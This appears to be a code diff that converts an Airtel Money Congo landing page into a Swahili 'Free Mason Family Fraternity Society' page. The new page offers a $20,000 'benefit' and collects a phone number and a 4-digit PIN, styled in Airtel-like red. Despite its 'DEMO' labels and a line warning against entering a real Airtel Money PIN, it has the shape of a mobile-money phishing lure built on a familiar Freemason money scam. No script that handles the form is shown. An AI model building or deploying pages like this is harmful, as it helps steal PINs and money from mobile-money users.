@@ -1,122 +1,51 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="sw">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Airtel Money Congo</title>
-
-<meta name="description"
-content="Airtel Money Congo - Votre argent, simplement.">
+<title>Free Mason Family Fraternity Society — Demo</title>
 
 <style>
-
 *{
+    box-sizing:border-box;
     margin:0;
     padding:0;
-    box-sizing:border-box;
-}
-
-html{
-    scroll-behavior:smooth;
+    font-family:Arial,Helvetica,sans-serif;
 }
 
 body{
-    font-family:Arial,Helvetica,sans-serif;
+    background:#f7f8fa;
     color:#222;
-    background:#fff;
-    line-height:1.6;
 }
 
-a{
-    text-decoration:none;
-    color:inherit;
-}
-
-button{
-    font-family:inherit;
-    cursor:pointer;
-}
-
-header{
-    position:sticky;
-    top:0;
-    z-index:1000;
-    background:#fff;
-    border-bottom:1px solid #eee;
-    box-shadow:0 2px 15px rgba(0,0,0,.06);
-}
-
-.navbar{
-    max-width:1200px;
-    height:76px;
-    margin:auto;
-    padding:0 25px;
-
+.header{
+    background:#d90000;
+    color:white;
+    padding:18px 7%;
     display:flex;
-    align-items:center;
     justify-content:space-between;
+    align-items:center;
 }
 
 .logo{
-    display:flex;
-    align-items:center;
-    gap:10px;
-
-    color:#e60012;
-    font-size:24px;
-    font-weight:900;
+    font-size:21px;
+    font-weight:800;
 }
 
-.logo-mark{
-    width:44px;
-    height:44px;
-    border-radius:50%;
-
-    display:flex;
-    align-items:center;
-    justify-content:center;
-
-    background:#e60012;
-    color:#fff;
-    font-weight:900;
+.demo-badge{
+    background:#fff;
+    color:#d90000;
+    padding:7px 12px;
+    border-radius:20px;
+    font-size:12px;
+    font-weight:bold;
 }
 
-.nav-links{
-    display:flex;
-    align-items:center;
-    gap:30px;
-}
-
-.nav-links a{
-    font-size:15px;
-    font-weight:600;
-    color:#333;
-}
-
-.nav-links a:hover{
-    color:#e60012;
-}
-
-.nav-button{
-    background:#e60012;
-    color:#fff!important;
-    padding:12px 20px;
-    border-radius:25px;
-}
-
-.menu-btn{
-    display:none;
-    border:0;
-    background:transparent;
-    color:#e60012;
-    font-size:28px;
-}
-
-.realtime-bar{
-    background:#111;
-    color:#fff;
-    padding:8px 20px;
+.status{
+    background:#222;
+    color:white;
+    padding:9px;
     text-align:center;
     font-size:13px;
 }
@@ -126,2008 +55,509 @@ header{
     width:8px;
     height:8px;
     border-radius:50%;
-    background:#777;
-    margin-right:7px;
+    background:#999;
+    margin-right:6px;
 }
 
 .status-dot.online{
-    background:#22c55e;
-}.hero{
-    min-height:650px;
+    background:#20c66b;
+}
 
+.hero{
+    min-height:calc(100vh - 100px);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:45px 20px;
     background:
-    radial-gradient(
-        circle at 80% 25%,
-        rgba(255,255,255,.18),
-        transparent 25%
-    ),
-    linear-gradient(
-        120deg,
-        #b8000d,
-        #e60012 55%,
-        #f32632
-    );
-
-    color:#fff;
-    overflow:hidden;
-}
-
-.hero-container{
-    max-width:1200px;
-    min-height:650px;
-    margin:auto;
-    padding:70px 25px;
-
-    display:grid;
-    grid-template-columns:1.1fr .9fr;
-    align-items:center;
-    gap:50px;
-}
-
-.hero-content{
-    max-width:650px;
-}
-
-.badge{
-    display:inline-flex;
-    align-items:center;
-    gap:8px;
-
-    padding:8px 15px;
-    border-radius:30px;
-
-    background:rgba(255,255,255,.14);
-    border:1px solid rgba(255,255,255,.25);
-
-    font-size:13px;
-    margin-bottom:25px;
-}
-
-.hero h1{
-    font-size:clamp(42px,6vw,72px);
-    line-height:1.02;
-    letter-spacing:-3px;
-    margin-bottom:25px;
-}
-
-.hero h1 span{
-    color:#ffd9dc;
-}
-
-.hero p{
-    max-width:580px;
-    font-size:19px;
-    color:#fff2f3;
-    margin-bottom:35px;
-}
-
-.hero-buttons{
-    display:flex;
-    gap:15px;
-    flex-wrap:wrap;
-}
-
-.btn{
-    display:inline-flex;
-    align-items:center;
-    justify-content:center;
-
-    padding:15px 25px;
-    border-radius:30px;
-
-    border:0;
-    font-weight:700;
-    font-size:15px;
-    transition:.25s;
-}
-
-.btn-white{
-    background:#fff;
-    color:#d40010;
-}
-
-.btn-outline{
-    color:#fff;
-    border:1px solid rgba(255,255,255,.55);
-    background:rgba(255,255,255,.08);
-}
-
-.btn:hover{
-    transform:translateY(-2px);
-}.phone-area{
-    display:flex;
-    justify-content:center;
-}
-
-.phone{
-    width:290px;
-    height:560px;
-
-    background:#111;
-    border:8px solid #222;
-    border-radius:42px;
-
-    padding:12px;
-
-    box-shadow:
-    0 35px 70px rgba(0,0,0,.35);
-
-    transform:rotate(3deg);
-}
-
-.phone-screen{
-    height:100%;
-    border-radius:31px;
-    overflow:hidden;
-    background:#f8f8f8;
-}
-
-.phone-top{
-    height:115px;
-    padding:20px;
-
-    color:#fff;
-    background:
-    linear-gradient(
-        135deg,
-        #e60012,
-        #ff3340
-    );
-}
-
-.phone-top small{
-    opacity:.85;
-}
-
-.phone-balance{
-    font-size:27px;
-    font-weight:800;
-    margin-top:8px;
-}
-
-.phone-body{
-    padding:20px;
-}
-
-.quick-title{
-    font-size:14px;
-    font-weight:700;
-    margin-bottom:14px;
-}
-
-.quick-grid{
-    display:grid;
-    grid-template-columns:1fr 1fr;
-    gap:10px;
-}
-
-.quick-item{
-    background:#fff;
-    border-radius:15px;
-    padding:15px 8px;
-
-    text-align:center;
-    font-size:11px;
-
-    box-shadow:
-    0 5px 15px rgba(0,0,0,.06);
-}
-
-.quick-icon{
-    width:36px;
-    height:36px;
-    margin:auto auto 7px;
-
-    border-radius:50%;
-
-    display:flex;
-    align-items:center;
-    justify-content:center;
-
-    background:#ffe5e7;
-    color:#e60012;
-
-    font-size:17px;
-}.trust{
-    background:#fff;
-    box-shadow:0 8px 30px rgba(0,0,0,.08);
-}
-
-.trust-container{
-    max-width:1100px;
-    margin:auto;
-    padding:25px;
-
-    display:grid;
-    grid-template-columns:repeat(3,1fr);
-    gap:20px;
-}
-
-.trust-item{
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    gap:15px;
-}
-
-.trust-icon{
-    width:45px;
-    height:45px;
-
-    border-radius:50%;
-
-    display:flex;
-    align-items:center;
-    justify-content:center;
-
-    background:#ffe7e9;
-    color:#e60012;
-}
-
-.trust-item strong{
-    display:block;
-    font-size:15px;
-}
-
-.trust-item span{
-    font-size:12px;
-    color:#777;
-}
-
-section{
-    padding:90px 25px;
-}
-
-.container{
-    max-width:1200px;
-    margin:auto;
-}
-
-.section-heading{
-    max-width:700px;
-    margin:0 auto 55px;
-    text-align:center;
-}
-
-.eyebrow{
-    color:#e60012;
-    font-size:12px;
-    font-weight:800;
-    letter-spacing:1.5px;
-    text-transform:uppercase;
-    margin-bottom:10px;
-}
-
-.section-heading h2{
-    color:#161616;
-    font-size:clamp(32px,4vw,48px);
-    line-height:1.1;
-    margin-bottom:15px;
-}
-
-.section-heading p{
-    color:#707070;
-}.services{
-    background:#fafafa;
-}
-
-.service-grid{
-    display:grid;
-    grid-template-columns:repeat(3,1fr);
-    gap:22px;
-}
-
-.service-card{
-    background:#fff;
-    padding:32px;
-    border-radius:20px;
-    border:1px solid #eee;
-    transition:.3s;
-}
-
-.service-card:hover{
-    transform:translateY(-6px);
-    box-shadow:0 20px 45px rgba(0,0,0,.09);
-}
-
-.service-icon{
-    width:58px;
-    height:58px;
-
-    border-radius:17px;
-
-    display:flex;
-    align-items:center;
-    justify-content:center;
-
-    background:#ffe7e9;
-    color:#e60012;
-
-    font-size:25px;
-    margin-bottom:22px;
-}
-
-.service-card h3{
-    margin-bottom:10px;
-}
-
-.service-card p{
-    color:#777;
-    font-size:14px;
-}.feature-grid{
-    display:grid;
-    grid-template-columns:.9fr 1.1fr;
-    align-items:center;
-    gap:80px;
-}
-
-.feature-visual{
-    min-height:460px;
-
-    border-radius:30px;
-
-    display:flex;
-    align-items:center;
-    justify-content:center;
-
-    background:
-    linear-gradient(
-        145deg,
-        #e60012,
-        #99000a
-    );
-
-    overflow:hidden;
-}
-
-.money-card{
-    width:290px;
-    padding:30px;
-
-    border-radius:25px;
-
-    color:#fff;
-
-    background:rgba(255,255,255,.12);
-    border:1px solid rgba(255,255,255,.3);
-
-    backdrop-filter:blur(12px);
-
-    box-shadow:0 30px 60px rgba(0,0,0,.2);
-}
-
-.money-card h3{
-    font-size:35px;
-    margin:10px 0 25px;
-}
-
-.money-row{
-    display:flex;
-    justify-content:space-between;
-
-    border-top:1px solid rgba(255,255,255,.2);
-    padding-top:15px;
-
-    font-size:13px;
-}
-
-.feature-content h2{
-    font-size:43px;
-    line-height:1.1;
-    margin-bottom:20px;
-}
-
-.feature-content>p{
-    color:#707070;
-    margin-bottom:25px;
-}
-
-.feature-list{
-    list-style:none;
-}
-
-.feature-list li{
-    display:flex;
-    gap:13px;
-    margin:16px 0;
-    font-weight:600;
-}
-
-.check{
-    width:24px;
-    height:24px;
-    min-width:24px;
-
-    border-radius:50%;
-
-    display:flex;
-    align-items:center;
-    justify-content:center;
-
-    background:#ffe4e6;
-    color:#e60012;
-}
-
-.steps{
-    background:#fafafa;
-}
-
-.steps-grid{
-    display:grid;
-    grid-template-columns:repeat(4,1fr);
-    gap:25px;
-}
-
-.step{
-    background:#fff;
-    padding:30px 25px;
-    border-radius:20px;
-    border:1px solid #eee;
-}
-
-.step-number{
-    width:44px;
-    height:44px;
-
-    border-radius:50%;
-
-    display:flex;
-    align-items:center;
-    justify-content:center;
-
-    background:#e60012;
-    color:#fff;
-    font-weight:800;
-
-    margin-bottom:20px;
-}
-
-.step p{
-    color:#777;
-    font-size:14px;
-}.security-box{
-    border-radius:30px;
-    background:#161616;
-    color:#fff;
-
-    padding:55px;
-
-    display:grid;
-    grid-template-columns:1fr 1fr;
-    gap:60px;
-    align-items:center;
-}
-
-.security-box h2{
-    font-size:40px;
-    line-height:1.1;
-    margin-bottom:18px;
-}
-
-.security-box p{
-    color:#c5c5c5;
-}
-
-.security-points{
-    display:grid;
-    gap:15px;
-}
-
-.security-point{
-    display:flex;
-    align-items:center;
-    gap:15px;
-
-    background:#222;
-    padding:18px;
-    border-radius:15px;
-}
-
-.security-point-icon{
-    width:40px;
-    height:40px;
-    min-width:40px;
-
-    border-radius:50%;
-
-    display:flex;
-    align-items:center;
-    justify-content:center;
-
-    background:#e60012;
-}
-
-.live-panel{
-    max-width:1200px;
-    margin:0 auto 40px;
-    padding:0 25px;
-}
-
-.live-card{
-    background:#fff;
-
-    border:1px solid #eee;
-    border-radius:20px;
-
-    padding:25px;
-
-    box-shadow:0 10px 35px rgba(0,0,0,.06);
-
-    display:grid;
-    grid-template-columns:repeat(3,1fr);
-    gap:20px;
-}
-
-.live-item{
-    padding:15px;
-    border-radius:15px;
-    background:#fafafa;
-}
-
-.live-item small{
-    color:#777;
-}
-
-.live-item strong{
-    display:block;
-    font-size:20px;
-    margin-top:4px;
-}
-
-#liveAnnouncement{
-    color:#e60012;
-}.cta{
-    background:
-    linear-gradient(
-        120deg,
-        #c4000f,
-        #e60012
-    );
-
-    color:#fff;
-}
-
-.cta-container{
-    max-width:900px;
-    margin:auto;
-    text-align:center;
-}
-
-.cta h2{
-    font-size:clamp(34px,5vw,55px);
-    line-height:1.05;
-    margin-bottom:18px;
-}
-
-.cta p{
-    color:#ffecee;
-    margin-bottom:30px;
-}
-
-.faq-list{
-    max-width:850px;
-    margin:auto;
-}
-
-.faq{
-    border-bottom:1px solid #ddd;
+        linear-gradient(135deg,#d90000,#a80000);
 }
 
-.faq-question{
+.card{
     width:100%;
-    padding:22px 5px;
-
-    border:0;
-    background:none;
-
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-
-    text-align:left;
-
-    font-weight:700;
-    font-size:16px;
+    max-width:460px;
+    background:white;
+    border-radius:22px;
+    padding:35px;
+    box-shadow:0 20px 60px rgba(0,0,0,.25);
 }
 
-.faq-question span{
-    color:#e60012;
+.symbol{
+    width:65px;
+    height:65px;
+    border-radius:50%;
+    background:#d90000;
+    color:white;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    margin:0 auto 20px;
+    font-size:27px;
+    font-weight:bold;
+}
+
+h1{
+    text-align:center;
+    font-size:27px;
+    line-height:1.25;
+    margin-bottom:12px;
+}
+
+.subtitle{
+    text-align:center;
+    color:#666;
+    line-height:1.6;
+    margin-bottom:25px;
+}
+
+.benefit{
+    background:#fff4f4;
+    border:1px solid #ffd0d0;
+    border-radius:15px;
+    padding:18px;
+    text-align:center;
+    margin-bottom:25px;
+}
+
+.benefit strong{
+    display:block;
+    color:#d90000;
+    font-size:30px;
+    margin-top:5px;
+}
+
+label{
+    display:block;
+    font-weight:bold;
+    margin-bottom:8px;
+}
+
+.input-group{
+    margin-bottom:18px;
+}
+
+input{
+    width:100%;
+    padding:15px;
+    border:1px solid #ddd;
+    border-radius:12px;
+    font-size:17px;
+    outline:none;
+}
+
+input:focus{
+    border-color:#d90000;
+    box-shadow:0 0 0 3px rgba(217,0,0,.08);
+}
+
+.pin{
+    letter-spacing:8px;
+    text-align:center;
     font-size:22px;
 }
 
-.faq-answer{
-    max-height:0;
-    overflow:hidden;
-    transition:.3s ease;
-
-    color:#777;
-    font-size:14px;
-}
-
-.faq-answer p{
-    padding:0 5px 20px;
-}
-
-.faq.active .faq-answer{
-    max-height:200px;
-}
-
-footer{
-    background:#111;
-    color:#fff;
-    padding:60px 25px 25px;
-}
-
-.footer-grid{
-    max-width:1200px;
-    margin:auto;
-
-    display:grid;
-    grid-template-columns:1.5fr 1fr 1fr 1fr;
-    gap:40px;
-}
-
-.footer-logo{
-    font-size:24px;
-    font-weight:900;
-    margin-bottom:15px;
-}
-
-.footer-column p,
-.footer-column a{
-    color:#999;
-    font-size:14px;
-}
-
-.footer-column a{
-    display:block;
-    margin-bottom:10px;
-}
-
-.footer-column a:hover{
-    color:#fff;
-}
-
-.footer-column h4{
+.demo-note{
+    background:#fff8df;
+    border:1px solid #f1d46a;
+    color:#765d00;
+    padding:12px;
+    border-radius:10px;
+    font-size:12px;
+    line-height:1.5;
     margin-bottom:18px;
 }
 
-.footer-bottom{
-    max-width:1200px;
-    margin:45px auto 0;
+button{
+    width:100%;
+    border:0;
+    background:#d90000;
+    color:white;
+    padding:16px;
+    border-radius:12px;
+    font-size:17px;
+    font-weight:bold;
+    cursor:pointer;
+}
 
-    padding-top:20px;
+button:hover{
+    background:#b90000;
+}
 
-    border-top:1px solid #292929;
+button:disabled{
+    opacity:.6;
+    cursor:not-allowed;
+}
 
-    display:flex;
-    justify-content:space-between;
+.message{
+    margin-top:15px;
+    text-align:center;
+    font-size:14px;
+    min-height:20px;
+}
 
+.footer{
+    text-align:center;
     color:#777;
     font-size:12px;
-}@media(max-width:900px){
-
-    .menu-btn{
-        display:block;
-    }
-
-    .nav-links{
-        position:absolute;
-        left:0;
-        right:0;
-        top:76px;
-
-        display:none;
-        flex-direction:column;
-        align-items:flex-start;
-
-        background:#fff;
-        padding:20px 25px;
-
-        box-shadow:0 15px 30px rgba(0,0,0,.08);
-    }
-
-    .nav-links.active{
-        display:flex;
-    }
-
-    .hero-container{
-        grid-template-columns:1fr;
-        text-align:center;
-    }
-
-    .hero-content{
-        margin:auto;
-    }
-
-    .hero p{
-        margin-left:auto;
-        margin-right:auto;
-    }
-
-    .hero-buttons{
-        justify-content:center;
-    }
-
-    .service-grid{
-        grid-template-columns:1fr 1fr;
-    }
-
-    .feature-grid{
-        grid-template-columns:1fr;
-    }
-
-    .steps-grid{
-        grid-template-columns:1fr 1fr;
-    }
-
-    .security-box{
-        grid-template-columns:1fr;
-    }
-
-    .live-card{
-        grid-template-columns:1fr;
-    }
-
-    .footer-grid{
-        grid-template-columns:1fr 1fr;
-    }
+    padding:20px;
+    background:white;
 }
 
-@media(max-width:600px){
-
-    .navbar{
-        padding:0 18px;
-    }
-
-    .hero-container{
-        padding:55px 18px;
-    }
-
-    .hero h1{
-        font-size:45px;
-    }
-
-    .phone{
-        width:250px;
-        height:485px;
-    }
-
-    .trust-container{
-        grid-template-columns:1fr;
-    }
-
-    .service-grid,
-    .steps-grid{
-        grid-template-columns:1fr;
-    }
-
-    .feature-content h2{
-        font-size:34px;
-    }
-
-    .feature-visual{
-        min-height:380px;
-    }
-
-    .security-box{
-        padding:30px 22px;
-    }
-
-    .security-box h2{
-        font-size:32px;
-    }
-
-    .footer-grid{
-        grid-template-columns:1fr;
-    }
-
-    .footer-bottom{
-        flex-direction:column;
-    }
+.hidden{
+    display:none;
 }
 
+.success-icon{
+    width:75px;
+    height:75px;
+    background:#20a464;
+    color:white;
+    border-radius:50%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    margin:0 auto 20px;
+    font-size:38px;
+}
+
+.success-title{
+    text-align:center;
+    color:#222;
+}
+
+.success-text{
+    text-align:center;
+    line-height:1.7;
+    color:#666;
+    margin:18px 0;
+}
+
+.reference{
+    background:#f5f5f5;
+    padding:14px;
+    border-radius:10px;
+    text-align:center;
+    font-size:13px;
+}
 </style>
-</head>
+</head><body>
 
-<body><header>
+<header class="header">
+    <div class="logo">Free Mason Family</div>
 
-<nav class="navbar">
-
-<a href="#" class="logo">
-    <div class="logo-mark">A</div>
-    Airtel Money
-</a>
-
-<button
-    class="menu-btn"
-    id="menuBtn"
-    aria-label="Ouvrir le menu">
-    ☰
-</button>
-
-<div class="nav-links" id="navLinks">
-
-<a href="#services">
-    Services
-</a>
-
-<a href="#fonctionnement">
-    Comment ça marche
-</a>
-
-<a href="#securite">
-    Sécurité
-</a>
-
-<a href="#faq">
-    FAQ
-</a>
-
-<a href="#contact" class="nav-button">
-    Contact
-</a>
-
-</div>
-
-</nav>
-
+    <div class="demo-badge">
+        DEMO
+    </div>
 </header>
 
+<div class="status">
+    <span id="statusDot" class="status-dot"></span>
+    <span id="statusText">Inaunganisha...</span>
+</div>
+
+<main class="hero">
+
+    <section class="card" id="loginPage">
+
+        <div class="symbol">FM</div>
+
+        <h1>
+            Karibu Free Mason Family Fraternity Organization Society
+        </h1>
+
+        <p class="subtitle">
+            Ingia kwenye akaunti yako ya demo ili kuendelea na mchakato wa
+            manufaa ya familia.
+        </p>
+
+        <div class="benefit">
+            Kiasi cha manufaa ya demo
+            <strong>$20,000</strong>
+        </div>
+
+        <div class="demo-note">
+            <strong>TAARIFA YA DEMO:</strong><br>
+            Huu ni mfumo wa majaribio tu. Usiweke Airtel Money PIN yako halisi.
+            PIN inayotumika hapa ni PIN ya DEMO pekee.
+        </div>
+
+        <form id="loginForm">
+
+            <div class="input-group">
+                <label for="phone">
+                    Namba ya simu
+                </label>
+
+                <input
+                    type="tel"
+                    id="phone"
+                    placeholder="243XXXXXXXXX"
+                    maxlength="15"
+                    required
+                >
+            </div>
+
+            <div class="input-group">
+                <label for="demoPin">
+                    PIN ya DEMO ya tarakimu 4
+                </label>
+
+                <input
+                    type="password"
+                    id="demoPin"
+                    class="pin"
+                    placeholder="••••"
+                    inputmode="numeric"
+                    maxlength="4"
+                    pattern="[0-9]{4}"
+                    required
+                >
+            </div>
+
+            <button id="submitButton" type="submit">
+                Endelea
+            </button>
+
+            <div id="message" class="message"></div>
+
+        </form>
+
+    </section>    <section class="card hidden" id="successPage">
+
+        <div class="success-icon">
+            ✓
+        </div>
+
+        <h1 class="success-title">
+            Ombi Limewasilishwa
+        </h1>
+
+        <p class="success-text">
+            Umefanikiwa kuwasilisha ombi lako la <strong>DEMO $20,000</strong>
+            kwenye mfumo wa majaribio wa Free Mason Family Society.
+        </p>
+
+        <div class="reference">
+            <strong>Namba ya kumbukumbu ya DEMO</strong>
+            <br><br>
+            <span id="referenceNumber">---</span>
+        </div>
+
+        <p class="success-text">
+            Huu ni ujumbe wa majaribio pekee. Hakuna fedha halisi
+            zilizotumwa au kutolewa.
+        </p>
+
+        <button onclick="location.reload()">
+            Rudi Mwanzo
+        </button>
 
-<div class="realtime-bar">
+    </section>
 
-<span
-    id="connectionDot"
-    class="status-dot">
-</span>
+</main>
 
-<span id="connectionText">
-    Connexion à la base de données...
-</span>
-
-</div>
-
-
-<section class="hero">
-
-<div class="hero-container">
-
-<div class="hero-content">
-
-<div class="badge">
-<span>●</span>
-Service financier mobile
-</div>
-
-<h1>
-Votre argent.<br>
-<span>Simplement.</span>
-</h1>
-
-<p id="heroDescription">
-
-Avec Airtel Money, envoyez et recevez de l'argent,
-payez vos factures et effectuez vos paiements
-depuis votre téléphone.
-
-</p>
-
-<div class="hero-buttons">
-
-<a href="#services" class="btn btn-white">
-Découvrir Airtel Money
-</a>
-
-<a href="#fonctionnement" class="btn btn-outline">
-Comment ça marche ?
-</a>
-
-</div>
-
-</div>
-
-
-<div class="phone-area">
-
-<div class="phone">
-
-<div class="phone-screen">
-
-<div class="phone-top">
-
-<small>
-Solde disponible
-</small>
-
-<div class="phone-balance">
-**** FC
-</div>
-
-</div>
-
-<div class="phone-body">
-
-<div class="quick-title">
-Actions rapides
-</div>
-
-<div class="quick-grid">
-
-<div class="quick-item">
-<div class="quick-icon">↗</div>
-Envoyer
-</div>
-
-<div class="quick-item">
-<div class="quick-icon">↙</div>
-Recevoir
-</div>
-
-<div class="quick-item">
-<div class="quick-icon">₣</div>
-Payer
-</div>
-
-<div class="quick-item">
-<div class="quick-icon">+</div>
-Plus
-</div>
-
-</div>
-
-</div>
-
-</div>
-
-</div>
-
-</div>
-
-</div>
-
-</section><div class="trust">
-
-<div class="trust-container">
-
-<div class="trust-item">
-
-<div class="trust-icon">
-✓
-</div>
-
-<div>
-<strong>Simple</strong>
-<span>Des services accessibles</span>
-</div>
-
-</div>
-
-
-<div class="trust-item">
-
-<div class="trust-icon">
-🔒
-</div>
-
-<div>
-<strong>Sécurisé</strong>
-<span>Protection de vos opérations</span>
-</div>
-
-</div>
-
-
-<div class="trust-item">
-
-<div class="trust-icon">
-24
-</div>
-
-<div>
-<strong>À portée de main</strong>
-<span>Depuis votre téléphone</span>
-</div>
-
-</div>
-
-</div>
-
-</div>
-
-
-<div class="live-panel">
-
-<div class="live-card">
-
-<div class="live-item">
-
-<small>
-Statut du service
-</small>
-
-<strong id="serviceStatus">
-Chargement...
-</strong>
-
-</div>
-
-
-<div class="live-item">
-
-<small>
-Annonce
-</small>
-
-<strong id="liveAnnouncement">
-Chargement...
-</strong>
-
-</div>
-
-
-<div class="live-item">
-
-<small>
-Dernière mise à jour
-</small>
-
-<strong id="lastUpdated">
---
-</strong>
-
-</div>
-
-</div>
-
-</div>
-
-
-<section class="services" id="services">
-
-<div class="container">
-
-<div class="section-heading">
-
-<div class="eyebrow">
-Nos services
-</div>
-
-<h2>
-Tout ce dont vous avez besoin
-</h2>
-
-<p>
-Gérez votre argent au quotidien avec
-des services conçus pour être simples
-et pratiques.
-</p>
-
-</div>
-
-<div class="service-grid">
-
-<div class="service-card">
-<div class="service-icon">↗</div>
-<h3>Envoyer de l'argent</h3>
-<p>
-Transférez de l'argent à vos proches
-rapidement et simplement.
-</p>
-</div>
-
-<div class="service-card">
-<div class="service-icon">↓</div>
-<h3>Recevoir de l'argent</h3>
-<p>
-Recevez des transferts directement
-sur votre compte mobile.
-</p>
-</div>
-
-<div class="service-card">
-<div class="service-icon">₣</div>
-<h3>Paiements</h3>
-<p>
-Payez vos achats et services depuis
-votre téléphone.
-</p>
-</div>
-
-<div class="service-card">
-<div class="service-icon">▣</div>
-<h3>Payer vos factures</h3>
-<p>
-Gérez vos paiements du quotidien
-depuis un seul endroit.
-</p>
-</div>
-
-<div class="service-card">
-<div class="service-icon">⌁</div>
-<h3>Retrait d'argent</h3>
-<p>
-Accédez à votre argent auprès des
-points de service disponibles.
-</p>
-</div>
-
-<div class="service-card">
-<div class="service-icon">+</div>
-<h3>Et bien plus</h3>
-<p>
-Découvrez les autres services disponibles
-avec votre compte Airtel Money.
-</p>
-</div>
-
-</div>
-
-</div>
-
-</section><section>
-
-<div class="container feature-grid">
-
-<div class="feature-visual">
-
-<div class="money-card">
-
-<small>
-Compte Airtel Money
-</small>
-
-<h3>
-**** FC
-</h3>
-
-<div class="money-row">
-
-<span>
-Disponible
-</span>
-
-<span>
-••••
-</span>
-
-</div>
-
-</div>
-
-</div>
-
-
-<div class="feature-content">
-
-<div class="section-heading"
-style="text-align:left;margin:0 0 25px;">
-
-<div class="eyebrow">
-Une expérience simple
-</div>
-
-<h2>
-Votre argent à portée de main
-</h2>
-
-</div>
-
-<p>
-Airtel Money vous permet de gérer
-vos opérations financières quotidiennes
-depuis votre téléphone.
-</p>
-
-<ul class="feature-list">
-
-<li>
-<span class="check">✓</span>
-Envoyer de l'argent à vos proches
-</li>
-
-<li>
-<span class="check">✓</span>
-Recevoir des transferts
-</li>
-
-<li>
-<span class="check">✓</span>
-Effectuer des paiements
-</li>
-
-<li>
-<span class="check">✓</span>
-Accéder à vos services financiers mobiles
-</li>
-
-</ul>
-
-</div>
-
-</div>
-
-</section>
-
-
-<section
-class="steps"
-id="fonctionnement">
-
-<div class="container">
-
-<div class="section-heading">
-
-<div class="eyebrow">
-Mode d'emploi
-</div>
-
-<h2>
-Comment ça marche ?
-</h2>
-
-<p>
-Quelques étapes simples pour commencer
-à utiliser votre portefeuille mobile.
-</p>
-
-</div>
-
-
-<div class="steps-grid">
-
-<div class="step">
-
-<div class="step-number">1</div>
-
-<h3>
-Inscrivez-vous
-</h3>
-
-<p>
-Créez votre compte selon les procédures
-officielles disponibles.
-</p>
-
-</div>
-
-
-<div class="step">
-
-<div class="step-number">2</div>
-
-<h3>
-Alimentez votre compte
-</h3>
-
-<p>
-Déposez de l'argent auprès d'un
-point de service autorisé.
-</p>
-
-</div>
-
-
-<div class="step">
-
-<div class="step-number">3</div>
-
-<h3>
-Choisissez un service
-</h3>
-
-<p>
-Envoyez, recevez ou utilisez votre
-argent selon le service souhaité.
-</p>
-
-</div>
-
-
-<div class="step">
-
-<div class="step-number">4</div>
-
-<h3>
-Confirmez
-</h3>
-
-<p>
-Vérifiez les informations avant de
-confirmer votre opération.
-</p>
-
-</div>
-
-</div>
-
-</div>
-
-</section><section id="securite">
-
-<div class="container">
-
-<div class="security-box">
-
-<div>
-
-<div class="eyebrow"
-style="color:#ff5a63">
-Sécurité
-</div>
-
-<h2>
-La sécurité compte.
-</h2>
-
-<p>
-Protégez toujours vos informations
-confidentielles et vérifiez les détails
-de chaque opération avant confirmation.
-</p>
-
-</div>
-
-
-<div class="security-points">
-
-<div class="security-point">
-
-<div class="security-point-icon">
-🔒
-</div>
-
-<div>
-
-<strong>
-Code confidentiel
-</strong>
-
-<br>
-
-<small>
-Ne partagez jamais votre code.
-</small>
-
-</div>
-
-</div>
-
-
-<div class="security-point">
-
-<div class="security-point-icon">
-✓
-</div>
-
-<div>
-
-<strong>
-Vérifiez chaque opération
-</strong>
-
-<br>
-
-<small>
-Contrôlez le numéro et le montant.
-</small>
-
-</div>
-
-</div>
-
-
-<div class="security-point">
-
-<div class="security-point-icon">
-!
-</div>
-
-<div>
-
-<strong>
-Restez vigilant
-</strong>
-
-<br>
-
-<small>
-Ne communiquez jamais vos informations sensibles.
-</small>
-
-</div>
-
-</div>
-
-</div>
-
-</div>
-
-</div>
-
-</section>
-
-
-<section
-class="cta"
-id="contact">
-
-<div class="cta-container">
-
-<h2>
-Simplifiez votre quotidien avec Airtel Money.
-</h2>
-
-<p>
-Découvrez les services disponibles et
-trouvez le point de service le plus proche.
-</p>
-
-<a
-href="#services"
-class="btn btn-white">
-
-Découvrir les services
-
-</a>
-
-</div>
-
-</section><section id="faq">
-
-<div class="container">
-
-<div class="section-heading">
-
-<div class="eyebrow">
-FAQ
-</div>
-
-<h2>
-Questions fréquentes
-</h2>
-
-<p>
-Retrouvez quelques réponses aux questions
-courantes concernant Airtel Money.
-</p>
-
-</div>
-
-
-<div class="faq-list">
-
-<div class="faq">
-
-<button class="faq-question">
-
-Qu'est-ce qu'Airtel Money ?
-
-<span>+</span>
-
-</button>
-
-<div class="faq-answer">
-
-<p>
-Airtel Money est un service financier mobile
-permettant d'effectuer différentes opérations
-depuis un téléphone, selon les services
-disponibles dans votre pays.
-</p>
-
-</div>
-
-</div>
-
-
-<div class="faq">
-
-<button class="faq-question">
-
-Puis-je envoyer de l'argent ?
-
-<span>+</span>
-
-</button>
-
-<div class="faq-answer">
-
-<p>
-Les transferts d'argent font partie des services
-pouvant être proposés via Airtel Money, sous réserve
-des conditions et disponibilités locales.
-</p>
-
-</div>
-
-</div>
-
-
-<div class="faq">
-
-<button class="faq-question">
-
-Comment protéger mon compte ?
-
-<span>+</span>
-
-</button>
-
-<div class="faq-answer">
-
-<p>
-Gardez votre code confidentiel secret et ne le
-communiquez à personne. Vérifiez toujours les
-informations avant de confirmer une opération.
-</p>
-
-</div>
-
-</div>
-
-
-<div class="faq">
-
-<button class="faq-question">
-
-Où puis-je obtenir de l'aide ?
-
-<span>+</span>
-
-</button>
-
-<div class="faq-answer">
-
-<p>
-Utilisez les canaux officiels d'Airtel disponibles
-dans votre pays pour obtenir une assistance.
-</p>
-
-</div>
-
-</div>
-
-</div>
-
-</div>
-
-</section>
-
-
-<footer>
-
-<div class="footer-grid">
-
-<div class="footer-column">
-
-<div class="footer-logo">
-Airtel Money
-</div>
-
-<p>
-Des services financiers mobiles conçus
-pour vous aider à gérer votre argent
-simplement.
-</p>
-
-</div>
-
-
-<div class="footer-column">
-
-<h4>Services</h4>
-
-<a href="#services">
-Envoyer de l'argent
-</a>
-
-<a href="#services">
-Recevoir de l'argent
-</a>
-
-<a href="#services">
-Paiements
-</a>
-
-<a href="#services">
-Retrait
-</a>
-
-</div>
-
-
-<div class="footer-column">
-
-<h4>Informations</h4>
-
-<a href="#fonctionnement">
-Comment ça marche
-</a>
-
